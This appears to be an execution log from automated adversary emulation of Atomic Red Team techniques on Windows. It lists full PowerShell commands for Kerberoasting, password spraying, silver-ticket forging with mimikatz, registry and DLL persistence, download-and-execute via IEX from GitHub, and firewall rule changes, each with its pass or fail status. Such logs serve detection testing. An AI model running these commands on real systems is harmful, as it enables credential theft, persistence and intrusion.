                'domain. \n'
                'This test is designed to mimic how SessionGopher can '
                'determine the additional systems within a domain, which has '
                'been used before by threat actors to aid in lateral '
                'movement. \n'
                'Reference: [Head Fake: Tackling Disruptive Ransomware '
                'Attacks](https://www.mandiant.com/resources/head-fake-tackling-disruptive-ransomware-attacks). \n'
                'Upon successful execution, this test will output the names of '
                'the computers that reside on the domain to the console '
                'window. \n',
 'executor': 'psh',
 'link_id': '0f18beea-f316-446d-b1a4-9d18eb0143cc',
 'name': 'Enumerate domain computers within Active Directory using '
         'DirectorySearcher',
 'pid': 5416,
 'plaintext_command': '$DirectorySearcher = New-Object '
                      'System.DirectoryServices.DirectorySearcher("(ObjectCategory=Computer)"); '
                      '$DirectorySearcher.PropertiesToLoad.Add("Name"); '
                      '$Computers = $DirectorySearcher.findall(); foreach '
                      '($Computer in $Computers) {;   $Computer = '
                      '$Computer.Properties.name;   if (!$Computer) { Continue '
                      '};   Write-Host $Computer}',
 'platform': 'windows',
 'run': '2023-11-27T07:25:41Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1087_002__discovery__account_discovery-_domain_account__4bf4facd1dad540d4b17ebe0db235707__trial_1

atomic_ordering: ['4bf4facd1dad540d4b17ebe0db235707']
------------------------------
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1558_003__credential-access__steal_or_forge_kerberos_tickets-_kerberoasting__91a18ae1efe4119a549cea2ac7de72c4__trial_1

atomic_ordering: ['91a18ae1efe4119a549cea2ac7de72c4']
------------------------------
{'ability_id': '91a18ae1efe4119a549cea2ac7de72c4',
 'agent_reported_time': '2023-11-11T13:10:03Z',
 'attack': {'tactic': 'credential-access',
            'technique_id': 'T1558.003',
            'technique_name': 'Steal or Forge Kerberos Tickets: Kerberoasting'},
 'command': 'Add-Type -AssemblyName System.IdentityModel; '
            '$ComputerFQDN=$env:LogonServer.trimStart(\'\\\') + "." + '
            '$env:UserDnsDomain; New-Object '
            'System.IdentityModel.Tokens.KerberosRequestorSecurityToken '
            '-ArgumentList "HTTP/$ComputerFQDN"',
 'delegated': '2023-12-03T06:41:14Z',
 'description': 'The following test will utilize native PowerShell Identity '
                'modules to query the domain to extract the Service Principal '
                'Names for a single computer. This behavior is typically used '
                'during a kerberos or silver ticket attack. \n'
                'A successful execution will output the SPNs for the endpoint '
                'in question.\n',
 'executor': 'psh',
 'link_id': '2c525a4b-77c3-4792-b37d-64365b3885be',
 'name': 'Request A Single Ticket via PowerShell',
 'pid': 9520,
 'plaintext_command': 'Add-Type -AssemblyName System.IdentityModel; '
                      '$ComputerFQDN=$env:LogonServer.trimStart(\'\\\') + "." '
                      '+ $env:UserDnsDomain; New-Object '
                      'System.IdentityModel.Tokens.KerberosRequestorSecurityToken '
                      '-ArgumentList "HTTP/$ComputerFQDN"',
 'platform': 'windows',
 'run': '2023-12-03T06:41:22Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1546_009__multiple__event_triggered_execution-_appcert_dlls__5d4905a2f789ff40c53b1ea8ee53df3d__trial_1

atomic_ordering: ['5d4905a2f789ff40c53b1ea8ee53df3d']
------------------------------
{'ability_id': '5d4905a2f789ff40c53b1ea8ee53df3d',
 'agent_reported_time': '2023-11-11T13:10:11Z',
 'attack': {'tactic': 'multiple',
            'technique_id': 'T1546.009',
            'technique_name': 'Event Triggered Execution: AppCert DLLs'},
 'command': 'Copy-Item "7e8ee7_AtomicTest.dll" '
            'C:\\Users\\Public\\AtomicTest.dll -Force; reg add '
            '"HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session '
            'Manager\\AppCertDlls" /v "AtomicTest" /t REG_EXPAND_SZ /d '
            '"C:\\Users\\Public\\AtomicTest.dll" /f; '
            'if($false){Restart-Computer}',
 'delegated': '2023-12-01T19:46:09Z',
 'description': "Creates a new 'AtomicTest' value pointing to an AppCert DLL "
                'in the AppCertDlls registry key. \n'
                'Once the computer restarted, the DLL will be loaded in '
                'multiple processes and write an \n'
                "'AtomicTest.txt' file in C:\\Users\\Public\\ to validate that "
                'the DLL executed succesfully.\n'
                '\n'
                'Reference: '
                'https://skanthak.homepage.t-online.de/appcert.html\n',
 'executor': 'psh',
 'link_id': '3af11ab9-2b1e-4336-bb13-8f4caa70e22e',
 'name': 'Create registry persistence via AppCert DLL',
 'pid': 1028,
 'plaintext_command': 'Copy-Item "7e8ee7_AtomicTest.dll" '
                      'C:\\Users\\Public\\AtomicTest.dll -Force; reg add '
                      '"HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session '
                      'Manager\\AppCertDlls" /v "AtomicTest" /t REG_EXPAND_SZ '
                      '/d "C:\\Users\\Public\\AtomicTest.dll" /f; '
                      'if($false){Restart-Computer}',
 'platform': 'windows',
 'run': '2023-12-01T19:46:37Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1574_008__multiple__hijack_execution_flow-_path_interception_by_search_order_hijacking__e538e0ff74962aaf1dbd08baa5c7853f__trial_1

atomic_ordering: ['e538e0ff74962aaf1dbd08baa5c7853f']
------------------------------
{'ability_id': 'e538e0ff74962aaf1dbd08baa5c7853f',
 'agent_reported_time': '2023-11-11T13:08:44Z',
 'attack': {'tactic': 'multiple',
            'technique_id': 'T1574.008',
            'technique_name': 'Hijack Execution Flow: Path Interception by '
                              'Search Order Hijacking'},
 'command': 'C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe '
            '/out:"$env:localappdata\\Microsoft\\WindowsApps\\Get-Variable.exe" '
            '"PathToAtomicsFolder\\T1574.008\\bin\\calc.cs"; Powershell '
            '-noprofile',
 'delegated': '2023-12-04T01:22:04Z',
 'description': 'Colibri leverages PowerShell in a unique way to maintain '
                'persistence after a reboot. Depending on the Windows version, '
                'Colibri drops its copy in '
                '%APPDATA%\\Local\\Microsoft\\WindowsApps and \n'
                'names it Get-Variable.exe for Windows 10 and above.\n'
                'https://blog.malwarebytes.com/threat-intelligence/2022/04/colibri-loader-combines-task-scheduler-and-powershell-in-clever-persistence-technique/\n',
 'executor': 'psh',
 'link_id': '1be09b65-e554-473a-b690-6ffaa2b06133',
 'name': 'powerShell Persistence via hijacking default modules - '
         'Get-Variable.exe',
 'pid': 4568,
 'plaintext_command': 'C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe '
                      '/out:"$env:localappdata\\Microsoft\\WindowsApps\\Get-Variable.exe" '
                      '"PathToAtomicsFolder\\T1574.008\\bin\\calc.cs"; '
                      'Powershell -noprofile',
 'platform': 'windows',
 'run': '2023-12-04T01:22:53Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1059_001__execution__command_and_scripting_interpreter-_powershell__fca2ce47cdb3acfde35139ca9017af80__trial_1

atomic_ordering: ['fca2ce47cdb3acfde35139ca9017af80']
------------------------------
{'ability_id': 'fca2ce47cdb3acfde35139ca9017af80',
 'agent_reported_time': '2023-11-11T13:09:52Z',
 'attack': {'tactic': 'execution',
            'technique_id': 'T1059.001',
            'technique_name': 'Command and Scripting Interpreter: PowerShell'},
 'command': '$RequiredModule = Get-Module -Name AtomicTestHarnesses '
            '-ListAvailable; if (-not $RequiredModule) {Install-Module -Name '
            'AtomicTestHarnesses -Scope CurrentUser -Force};  ;  '
            'Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType '
            'Hyphen -EncodedCommandParamVariation E -Execute -ErrorAction Stop',
 'delegated': '2023-11-28T09:34:23Z',
 'description': 'Executes powershell.exe with variations of the '
                '-EncodedCommand parameter',
 'executor': 'psh',
 'link_id': '285493d5-7250-4c03-99a1-85cc9fdbd5b3',
 'name': 'ATHPowerShellCommandLineParameter -EncodedCommand parameter '
         'variations',
 'pid': 712,
 'plaintext_command': '$RequiredModule = Get-Module -Name AtomicTestHarnesses '
                      '-ListAvailable; if (-not $RequiredModule) '
                      '{Install-Module -Name AtomicTestHarnesses -Scope '
                      'CurrentUser -Force};  ;  '
                      'Out-ATHPowerShellCommandLineParameter '
                      '-CommandLineSwitchType Hyphen '
                      '-EncodedCommandParamVariation E -Execute -ErrorAction '
                      'Stop',
 'platform': 'windows',
 'run': '2023-11-28T09:35:09Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1110_003__credential-access__brute_force-_password_spraying__279d24eeb12b40e4547945accf59ca62__trial_1

atomic_ordering: ['279d24eeb12b40e4547945accf59ca62']
------------------------------
{'ability_id': '279d24eeb12b40e4547945accf59ca62',
 'agent_reported_time': '2023-11-11T13:09:56Z',
 'attack': {'tactic': 'credential-access',
            'technique_id': 'T1110.003',
            'technique_name': 'Brute Force: Password Spraying'},
 'command': 'if (Test-Path  $env:Temp\\usersdpsLight.txt) { ; } else '
            '{Write-Host -NoNewLine "Reading Users."; $netOutput = net users '
            '/domain; $netOutput = '
            '[System.Collections.ArrayList]($netOutput[6..($netOutput.length-3)]); '
            '$userLimit = 200; $usercount = 0; foreach ($line in $netOutput) '
            '{;   if($usercount -ge $userLimit){break};   $line = '
            "$line.trim();   $line = $line -split '\\s\\s+';   foreach ($user "
            'in $line){;     if($usercount -ge $userLimit){break};     '
            'Add-Content $env:Temp\\usersdpsLight.txt $user;     $usercount = '
            '$usercount + 1;     }  ; }; Write-Host "Usernames saved to '
            '$env:Temp\\usersdpsLight.txt"};  ;  function Invoke-dpsLight '
            '($Password, $userlist) {; $users = Get-Content $userlist; $Domain '
            '= "LDAP://" + ([ADSI]"").distinguishedName; foreach ($User in '
            '$users) {;   $Domain_check = New-Object '
            'System.DirectoryServices.DirectoryEntry($Domain, $User, '
            '$Password);   if ($Domain_check.name -ne $null) {;     Write-Host '
            '-ForegroundColor Green "Password found for User:$User '
            'Password:$Password";   };   else { Write-Host ". " -NoNewline}; '
            '}; Write-Host -ForegroundColor green "Finished"; }; '
            'Invoke-dpsLight "Spring2020" $env:Temp\\usersdpsLight.txt',
 'delegated': '2023-11-29T20:40:44Z',
 'description': 'Perform a domain password spray using the same core method of '
                'the [DomainPasswordSpray '
                'tool](https://github.com/dafthack/DomainPasswordSpray) \n'
                'but without all the extra code that makes the script get '
                'blocked by many AVs. \n'
                'This atomic test will attempt a single password against all '
                'users in a password list at $env:Temp\\usersdpsLight.txt. You '
                'can create this file manually\n'
                'or with the automated prereq_command. The prereq_command will '
                'limit the user list to 200 users by default to help you avoid '
                'massive account lockout.\n',
 'executor': 'psh',
 'link_id': '9208c591-bcc4-425e-9683-a23ca08c0ee0',
 'name': 'Password Spray Invoke-DomainPasswordSpray Light',
 'pid': 11088,
 'plaintext_command': 'if (Test-Path  $env:Temp\\usersdpsLight.txt) { ; } else '
                      '{Write-Host -NoNewLine "Reading Users."; $netOutput = '
                      'net users /domain; $netOutput = '
                      '[System.Collections.ArrayList]($netOutput[6..($netOutput.length-3)]); '
                      '$userLimit = 200; $usercount = 0; foreach ($line in '
                      '$netOutput) {;   if($usercount -ge '
                      '$userLimit){break};   $line = $line.trim();   $line = '
                      "$line -split '\\s\\s+';   foreach ($user in "
                      '$line){;     if($usercount -ge $userLimit){break};     '
                      'Add-Content $env:Temp\\usersdpsLight.txt $user;     '
                      '$usercount = $usercount + 1;     }  ; }; Write-Host '
                      '"Usernames saved to $env:Temp\\usersdpsLight.txt"};  ;  '
                      'function Invoke-dpsLight ($Password, $userlist) {; '
                      '$users = Get-Content $userlist; $Domain = "LDAP://" + '
                      '([ADSI]"").distinguishedName; foreach ($User in $users) '
                      '{;   $Domain_check = New-Object '
                      'System.DirectoryServices.DirectoryEntry($Domain, $User, '
                      '$Password);   if ($Domain_check.name -ne $null) {;     '
                      'Write-Host -ForegroundColor Green "Password found for '
                      'User:$User Password:$Password";   };   else { '
                      'Write-Host ". " -NoNewline}; }; Write-Host '
                      '-ForegroundColor green "Finished"; }; Invoke-dpsLight '
                      '"Spring2020" $env:Temp\\usersdpsLight.txt',
 'platform': 'windows',
 'run': '2023-11-29T20:41:10Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1218_001__defense-evasion__signed_binary_proxy_execution-_compiled_html_file__0d2e984bedf73f5266e250d7ecd257cf__trial_1

atomic_ordering: ['0d2e984bedf73f5266e250d7ecd257cf']
------------------------------
{'ability_id': '0d2e984bedf73f5266e250d7ecd257cf',
 'agent_reported_time': '2023-11-11T13:10:16Z',
 'attack': {'tactic': 'defense-evasion',
            'technique_id': 'T1218.001',
            'technique_name': 'Signed Binary Proxy Execution: Compiled HTML '
                              'File'},
 'command': '$RequiredModule = Get-Module -Name AtomicTestHarnesses '
            '-ListAvailable; if (-not $RequiredModule) {Install-Module -Name '
            'AtomicTestHarnesses -Scope CurrentUser -Force};  ;  '
            'Invoke-ATHCompiledHelp -HHFilePath $env:windir\\hh.exe '
            '-CHMFilePath Test.chm',
 'delegated': '2023-11-30T18:14:41Z',
 'description': 'Executes a CHM file with the default Shortcut Command method.',
 'executor': 'psh',
 'link_id': '4629075b-89eb-41e5-8f01-b111e11c0749',
 'name': 'Invoke CHM with default Shortcut Command Execution',
 'pid': 212,
 'plaintext_command': '$RequiredModule = Get-Module -Name AtomicTestHarnesses '
                      '-ListAvailable; if (-not $RequiredModule) '
                      '{Install-Module -Name AtomicTestHarnesses -Scope '
                      'CurrentUser -Force};  ;  Invoke-ATHCompiledHelp '
                      '-HHFilePath $env:windir\\hh.exe -CHMFilePath Test.chm',
 'platform': 'windows',
 'run': '2023-11-30T18:15:30Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1547_001__multiple__boot_or_logon_autostart_execution-_registry_run_keys_,_startup_folder__3c0760559a620aad7664cdf98f486127__trial_1

atomic_ordering: ['3c0760559a620aad7664cdf98f486127']
------------------------------
{'ability_id': '3c0760559a620aad7664cdf98f486127',
 'agent_reported_time': '2023-11-11T13:09:43Z',
 'attack': {'tactic': 'multiple',
            'technique_id': 'T1547.001',
            'technique_name': 'Boot or Logon Autostart Execution: Registry Run '
                              'Keys / Startup Folder'},
 'command': '$RunOnceKey = '
            '"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce"; '
            'set-itemproperty $RunOnceKey "NextRun" \'powershell.exe "IEX '
            '(New-Object '
            'Net.WebClient).DownloadString(`"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1547.001/src/Discovery.bat`")"\'',
 'delegated': '2023-12-02T02:29:18Z',
 'description': 'RunOnce Key Persistence via PowerShell\n'
                'Upon successful execution, a new entry will be added to the '
                'runonce item in the registry.\n',
 'executor': 'psh',
 'link_id': '7a7c27e4-7783-4a36-aecf-57752b4a01d8',
 'name': 'PowerShell Registry RunOnce',
 'pid': 4532,
 'plaintext_command': '$RunOnceKey = '
                      '"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce"; '
                      'set-itemproperty $RunOnceKey "NextRun" \'powershell.exe '
                      '"IEX (New-Object '
                      'Net.WebClient).DownloadString(`"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1547.001/src/Discovery.bat`")"\'',
 'platform': 'windows',
 'run': '2023-12-02T02:29:29Z',
 'status': 0}
------------------------------
^ successfully executed technique
==============================
==============================
adversary_id: atomic__t1558_002__credential-access__steal_or_forge_kerberos_tickets-_silver_ticket__8bdb353bbee5378745783ff6f2d49cb0__trial_1

atomic_ordering: ['8bdb353bbee5378745783ff6f2d49cb0']
------------------------------
{'ability_id': '8bdb353bbee5378745783ff6f2d49cb0',
 'agent_reported_time': '2023-11-11T13:09:51Z',
 'attack': {'tactic': 'credential-access',
            'technique_id': 'T1558.002',
            'technique_name': 'Steal or Forge Kerberos Tickets: Silver Ticket'},
 'command': 'Remove-Item $env:TEMP\\silver.bat -ErrorAction Ignore; '
            'Remove-Item $env:TEMP\\silver.txt -ErrorAction Ignore; '
            '$domain_sid = "S-1-5-21-DEFAULT"; If ($domain_sid -Match '
            '"DEFAULT") {;   $domain = gwmi Win32_ComputerSystem | Select '
            '-Expand Domain;   $krbtgtSID = (New-Object '
            'Security.Principal.NTAccount '
            '$domain\\krbtgt).Translate([Security.Principal.SecurityIdentifier]).Value;   '
            '$domain_sid = $krbtgtSID.SubString(0, '
            '$krbtgtSID.LastIndexOf(\'-\')); }; @"; >%TEMP%\\silver.txt 2>&1 '
            '(;   echo Purge existing tickets and create silver ticket:;   '
            'klist purge;   '
            'PathToAtomicsFolder\\..\\ExternalPayloads\\mimikatz\\x64\\mimikatz.exe '
            '"kerberos::golden /domain:%userdnsdomain% /sid:DOMAIN_SID '
            '/aes256:b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9 '
            '/user:silverticketfakeuser /service:HOST '
            '/target:%logonserver:\\\\=%.%userdnsdomain% /ptt" "exit";   '
            'echo.;   echo executing:schtasks /query /S '
            '%logonserver:\\\\=%.%userdnsdomain%;   schtasks /query /S '
            '%logonserver:\\\\=%.%userdnsdomain%;   ;   echo.;   echo Tickets '
            'after requesting schtasks:;   klist;   echo.;   echo End of '
            'Silver Ticket attack; ); "@ -Replace "DOMAIN_SID", $domain_sid | '
            'Out-File -Encoding OEM $env:TEMP\\silver.bat; echo "foo" | runas '
            '/netonly /user:fake "$env:TEMP\\silver.bat" | Out-Null; do {;   '
            'Start-Sleep 1;   Get-Content -Path "$env:TEMP\\silver.txt" -Wait '
            "| ForEach-Object {;     if ($_ -match 'End of Silver Ticket "
            "attack') { break } ;   }; } while ($false); Get-Content "
            '$env:TEMP\\silver.txt; Remove-Item $env:TEMP\\silver.bat '
            '-ErrorAction Ignore; Remove-Item $env:TEMP\\silver.txt '
            '-ErrorAction Ignore',
 'delegated': '2023-12-03T05:23:04Z',
 'description': 'Once the hash of service account is retrieved it is possible '
                'to forge Kerberos ticket granting service (TGS) tickets, also '
                'known as silver tickets.\n'
                'The generated ticket is injected in a new empty Windows '
                'session and discarded after, so it does not pollute the '
                'current Windows session.\n',
 'executor': 'psh',
 'link_id': '4df36f93-3d82-44bc-9bdb-e231421d065e',
 'name': 'Crafting Active Directory silver tickets with mimikatz',
 'pid': 4688,
 'plaintext_command': 'Remove-Item $env:TEMP\\silver.bat -ErrorAction Ignore; '
                      'Remove-Item $env:TEMP\\silver.txt -ErrorAction Ignore; '
                      '$domain_sid = "S-1-5-21-DEFAULT"; If ($domain_sid '
                      '-Match "DEFAULT") {;   $domain = gwmi '
                      'Win32_ComputerSystem | Select -Expand Domain;   '
                      '$krbtgtSID = (New-Object Security.Principal.NTAccount '
                      '$domain\\krbtgt).Translate([Security.Principal.SecurityIdentifier]).Value;   '
                      '$domain_sid = $krbtgtSID.SubString(0, '
                      '$krbtgtSID.LastIndexOf(\'-\')); }; @"; '
                      '>%TEMP%\\silver.txt 2>&1 (;   echo Purge existing '
                      'tickets and create silver ticket:;   klist purge;   '
                      'PathToAtomicsFolder\\..\\ExternalPayloads\\mimikatz\\x64\\mimikatz.exe '
                      '"kerberos::golden /domain:%userdnsdomain% '
                      '/sid:DOMAIN_SID '
                      '/aes256:b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9 '
                      '/user:silverticketfakeuser /service:HOST '
                      '/target:%logonserver:\\\\=%.%userdnsdomain% /ptt" '
                      '"exit";   echo.;   echo executing:schtasks /query /S '
                      '%logonserver:\\\\=%.%userdnsdomain%;   schtasks /query '
                      '/S %logonserver:\\\\=%.%userdnsdomain%;   ;   echo.;   '
                      'echo Tickets after requesting schtasks:;   klist;   '
                      'echo.;   echo End of Silver Ticket attack; ); "@ '
                      '-Replace "DOMAIN_SID", $domain_sid | Out-File -Encoding '
                      'OEM $env:TEMP\\silver.bat; echo "foo" | runas /netonly '
                      '/user:fake "$env:TEMP\\silver.bat" | Out-Null; do {;   '
                      'Start-Sleep 1;   Get-Content -Path '
                      '"$env:TEMP\\silver.txt" -Wait | ForEach-Object {;     '
                      "if ($_ -match 'End of Silver Ticket attack') { break } "
                      ';   }; } while ($false); Get-Content '
                      '$env:TEMP\\silver.txt; Remove-Item '
                      '$env:TEMP\\silver.bat -ErrorAction Ignore; Remove-Item '
                      '$env:TEMP\\silver.txt -ErrorAction Ignore',
 'platform': 'windows',
 'run': '2023-12-03T05:23:20Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1218_004__defense-evasion__signed_binary_proxy_execution-_installutil__3ed2af2ffd2e21a9b97fbfb732ef3971__trial_1

atomic_ordering: ['3ed2af2ffd2e21a9b97fbfb732ef3971']
------------------------------
{'ability_id': '3ed2af2ffd2e21a9b97fbfb732ef3971',
 'agent_reported_time': '2023-11-11T13:10:12Z',
 'attack': {'tactic': 'defense-evasion',
            'technique_id': 'T1218.004',
            'technique_name': 'Signed Binary Proxy Execution: InstallUtil'},
 'command': 'if (Test-Path "eaecbe_InstallUtilTestHarness.ps1") { ; } else '
            '{New-Item -Type Directory (split-path '
            '"eaecbe_InstallUtilTestHarness.ps1") -ErrorAction ignore | '
            'Out-Null; Invoke-WebRequest '
            "'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.004/src/InstallUtilTestHarness.ps1' "
            '-OutFile "eaecbe_InstallUtilTestHarness.ps1"};  ; . '
            '"eaecbe_InstallUtilTestHarness.ps1"; $InstallerAssemblyDir = '
            '"$Env:windir\\System32\\Tasks"; $InstallerAssemblyFileName = '
            "'readme.txt'; $InstallerAssemblyFullPath = Join-Path -Path "
            '$InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName; '
            '$CommandLine = "readme.txt"; $ExpectedOutput = \'Constructor_\'; '
            'Set-Location "$Env:windir\\System32\\Tasks"; Copy-Item -Path '
            '"$([System.Runtime.InteropServices.RuntimeEnvironment]::GetRuntimeDirectory())InstallUtil.exe" '
            '-Destination "$Env:windir\\System32\\Tasks\\notepad.exe"; '
            '$TestArgs = @{;     OutputAssemblyDirectory = '
            '$InstallerAssemblyDir;     OutputAssemblyFileName = '
            '$InstallerAssemblyFileName;     InvocationMethod = '
            "'Executable';     CommandLine = $CommandLine;     InstallUtilPath "
            '= "$Env:windir\\System32\\Tasks\\notepad.exe"; }; $ActualOutput = '
            'Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs '
            '-MinimumViableAssembly; if ($ActualOutput -ne $ExpectedOutput) '
            '{;     throw @"; Evasive Installutil invocation test failure. '
            'Installer assembly execution output did not match the expected '
            'output.; Expected: $ExpectedOutput; Actual: $ActualOutput; "@; }',
 'delegated': '2023-11-30T19:52:11Z',
 'description': 'Executes an InstallUtil assembly by renaming InstallUtil.exe '
                'and using a nonstandard extension for the assembly. Upon '
                'execution, "Running a transacted installation."\n'
                'will be displayed, along with other information about the '
                'opperation. "The transacted install has completed." will be '
                'displayed upon completion.\n',
 'executor': 'psh',
 'link_id': 'fad8dd28-1a70-42c8-81db-ea8df2f2949c',
 'name': 'InstallUtil evasive invocation',
 'pid': 8972,
 'plaintext_command': 'if (Test-Path "eaecbe_InstallUtilTestHarness.ps1") { ; '
                      '} else {New-Item -Type Directory (split-path '
                      '"eaecbe_InstallUtilTestHarness.ps1") -ErrorAction '
                      'ignore | Out-Null; Invoke-WebRequest '
                      "'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.004/src/InstallUtilTestHarness.ps1' "
                      '-OutFile "eaecbe_InstallUtilTestHarness.ps1"};  ; . '
                      '"eaecbe_InstallUtilTestHarness.ps1"; '
                      '$InstallerAssemblyDir = "$Env:windir\\System32\\Tasks"; '
                      "$InstallerAssemblyFileName = 'readme.txt'; "
                      '$InstallerAssemblyFullPath = Join-Path -Path '
                      '$InstallerAssemblyDir -ChildPath '
                      '$InstallerAssemblyFileName; $CommandLine = '
                      '"readme.txt"; $ExpectedOutput = \'Constructor_\'; '
                      'Set-Location "$Env:windir\\System32\\Tasks"; Copy-Item '
                      '-Path '
                      '"$([System.Runtime.InteropServices.RuntimeEnvironment]::GetRuntimeDirectory())InstallUtil.exe" '
                      '-Destination '
                      '"$Env:windir\\System32\\Tasks\\notepad.exe"; $TestArgs '
                      '= @{;     OutputAssemblyDirectory = '
                      '$InstallerAssemblyDir;     OutputAssemblyFileName = '
                      '$InstallerAssemblyFileName;     InvocationMethod = '
                      "'Executable';     CommandLine = $CommandLine;     "
                      'InstallUtilPath = '
                      '"$Env:windir\\System32\\Tasks\\notepad.exe"; }; '
                      '$ActualOutput = '
                      'Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs '
                      '-MinimumViableAssembly; if ($ActualOutput -ne '
                      '$ExpectedOutput) {;     throw @"; Evasive Installutil '
                      'invocation test failure. Installer assembly execution '
                      'output did not match the expected output.; Expected: '
                      '$ExpectedOutput; Actual: $ActualOutput; "@; }',
 'platform': 'windows',
 'run': '2023-11-30T19:52:30Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1518__discovery__software_discovery__57548b3eefc3c3d3eaf8c3b51380921a__trial_1

atomic_ordering: ['57548b3eefc3c3d3eaf8c3b51380921a']
------------------------------
{'ability_id': '57548b3eefc3c3d3eaf8c3b51380921a',
 'agent_reported_time': '2023-11-11T13:09:58Z',
 'attack': {'tactic': 'discovery',
            'technique_id': 'T1518',
            'technique_name': 'Software Discovery'},
 'command': "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; "
            'iex(new-object '
            "net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); "
            'powerSQL -noninteractive -consoleoutput',
 'delegated': '2023-12-01T14:16:52Z',
 'description': 'Start PowerUpSQL Checks using powerSQL function of WinPwn',
 'executor': 'psh',
 'link_id': 'beda0c29-9b64-4a0f-a691-12a6c74076b1',
 'name': 'WinPwn - powerSQL',
 'pid': 11116,
 'plaintext_command': "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; "
                      'iex(new-object '
                      "net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); "
                      'powerSQL -noninteractive -consoleoutput',
 'platform': 'windows',
 'run': '2023-12-01T14:17:16Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1546__multiple__event_triggered_execution__2fc2b9c9b48990938653dbe8966d487d__trial_1

atomic_ordering: ['2fc2b9c9b48990938653dbe8966d487d']
------------------------------
{'ability_id': '2fc2b9c9b48990938653dbe8966d487d',
 'agent_reported_time': '2023-11-11T13:09:09Z',
 'attack': {'tactic': 'multiple',
            'technique_id': 'T1546',
            'technique_name': 'Event Triggered Execution'},
 'command': 'if (Test-Path '
            'PathToAtomicsFolder\\T1546\\bin\\AltWinSock2DLL.dll) { ; } else '
            '{New-Item -Type Directory "PathToAtomicsFolder\\T1546\\bin\\" '
            '-ErrorAction ignore | Out-Null; Invoke-WebRequest '
            '"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546/bin/AltWinSock2DLL.dll" '
            '-OutFile "PathToAtomicsFolder\\T1546\\bin\\AltWinSock2DLL.dll"};  '
            ';  Set-ItemProperty '
            'HKLM:\\SYSTEM\\CurrentControlSet\\Services\\WinSock2\\Parameters '
            '-Name AutodialDLL -Value '
            'PathToAtomicsFolder\\T1546\\bin\\AltWinSock2DLL.dll',
 'delegated': '2023-12-01T22:41:06Z',
 'description': 'The DLL pointed to by the AutodialDLL registry key is loaded '
                'every time a process connects to the internet. Attackers can '
                'gain persistent code execution by setting this key to a DLL '
                'of their choice. \n'
                '\n'
                'The sample dll provided, AltWinSock2DLL, will launch the '
                'notepad process. Starting and stopping a web browser such as '
                'MS Edge or Chrome should result in the dll executing.\n'
                '[Blog](https://www.mdsec.co.uk/2022/10/autodialdlling-your-way/)\n',
 'executor': 'psh',
 'link_id': 'a6d26b98-4766-4859-9d2f-018e19159f89',
 'name': 'Persistence with Custom AutodialDLL',
 'pid': 5428,
 'plaintext_command': 'if (Test-Path '
                      'PathToAtomicsFolder\\T1546\\bin\\AltWinSock2DLL.dll) { '
                      '; } else {New-Item -Type Directory '
                      '"PathToAtomicsFolder\\T1546\\bin\\" -ErrorAction ignore '
                      '| Out-Null; Invoke-WebRequest '
                      '"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546/bin/AltWinSock2DLL.dll" '
                      '-OutFile '
                      '"PathToAtomicsFolder\\T1546\\bin\\AltWinSock2DLL.dll"};  '
                      ';  Set-ItemProperty '
                      'HKLM:\\SYSTEM\\CurrentControlSet\\Services\\WinSock2\\Parameters '
                      '-Name AutodialDLL -Value '
                      'PathToAtomicsFolder\\T1546\\bin\\AltWinSock2DLL.dll',
 'platform': 'windows',
 'run': '2023-12-01T22:41:18Z',
 'status': 0}
------------------------------
^ successfully executed technique
==============================
==============================
adversary_id: atomic__t1562_004__defense-evasion__impair_defenses-_disable_or_modify_system_firewall__34f398de2b04b96158b3bd25abaea5a7__trial_1

atomic_ordering: ['34f398de2b04b96158b3bd25abaea5a7']
------------------------------
{'ability_id': '34f398de2b04b96158b3bd25abaea5a7',
 'agent_reported_time': '2023-11-11T13:08:34Z',
 'attack': {'tactic': 'defense-evasion',
            'technique_id': 'T1562.004',
            'technique_name': 'Impair Defenses: Disable or Modify System '
                              'Firewall'},
 'command': 'Copy-Item "f7ce09_AtomicTest.exe" -Destination '
            '"C:\\Users\\$env:UserName" -Force; netsh advfirewall firewall add '
            'rule name="Atomic Test" dir=in action=allow '
            'program="C:\\Users\\$env:UserName\\AtomicTest.exe" enable=yes',
 'delegated': '2023-12-03T16:00:45Z',
